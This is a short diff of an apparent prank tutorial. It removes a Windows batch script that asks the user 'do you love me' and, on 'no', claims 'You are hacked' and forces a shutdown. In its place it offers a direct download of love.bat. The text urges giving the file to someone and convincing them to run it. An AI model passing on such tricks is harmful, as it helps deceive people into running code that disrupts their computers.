@@ -13,25 +13,7 @@ Just Open Notepad in your PC...
 And type the following codes...
 
 
-CODE:
-
-@echo off
-color 57
-echo Hey, do you love me (only answer in yes or no)
-set /p love=
-if %love%==yes goto love
-if %love%==no goto hate
-:love
-echo I love you too...
-echo Meet you soon :)
-pause 
-exit
-:hate
-echo But I love you....hehehehehe
-echo You are hacked...
-echo Your PC will crash in 10 seconds
-timeout 10
-shutdown -s -t 10
+CODE: in txt file or you can just download love.bat file to directly execute the file.
 
 After typing, Save the file as Love.bat
 Now give this file to the person you want through pendrive or as an attachment and convince them to execute this file....
